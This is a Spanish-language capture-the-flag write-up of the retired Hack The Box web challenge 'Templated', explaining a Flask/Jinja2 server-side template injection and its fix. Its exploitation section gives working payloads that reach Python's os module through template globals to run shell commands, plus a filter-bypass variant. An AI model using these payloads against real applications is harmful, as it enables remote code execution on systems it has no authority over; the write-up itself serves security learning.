---
challenge: Templated
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, jinja2, ssti, rce]
---


# Templated — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Aplicación Flask que saluda por nombre: `/<nombre>` se mete en `render_template_string`. Es **SSTI de Jinja2** en estado puro: `{{7*7}}` devuelve `49` y el salto a RCE se hace llegando a `os` por los globals de una función de Python.

## Enunciado y superficie

```text
http://<IP>:<puerto>/John
```

Devuelve `Hello John`. Un 404 personalizado sugiere que el nombre se renderiza, no solo se imprime.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```python
@app.route("/<name>")
def index(name):
    return render_template_string("Hello " + name)
```

La entrada se compila como plantilla. Hay dos comprobaciones rápidas:

```text
/{{7*7}}        -> Hello 49
/{{7*'7'}}      -> Hello 7777777
```

La primera confirma evaluación aritmética; la segunda, que es Jinja2 (Twig devolvería `49` en ambos casos).

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

En Jinja2 se llega a `os` desde los globals de cualquier función accesible:

```text
/{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}
```

Alternativa sin `config`:

```text
/{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}
/{{lipsum.__globals__['os'].popen('id').read()}}
```

```text
HTB{<flag>}
```

Si el reto filtra `.` o `_`, `request|attr('application')|attr('__globals__')` permite lo mismo con filtros.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **URL con caracteres raros**: codificar `{`, `}`, `'` y `[` si el cliente se queja; usar `curl --path-as-is` cuando haga falta.
- **Saltos de línea**: `popen(...).read()` imprime la salida con `\n`; a veces hay que recortar con `[:50]`.
- **Doble escape**: si el framework escapa la respuesta, probar `{%print(...)%}`.

- Concatenar entrada en `render_template_string` es RCE, no un saludo.
- Las funciones globales de Jinja2 (`cycler`, `lipsum`, `joiner`) son el puente estándar a `os`.
- Mitigación: `render_template` con variables (`{{ name }}`), nunca plantillas construidas con entrada del usuario; sandbox si de verdad hace falta.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
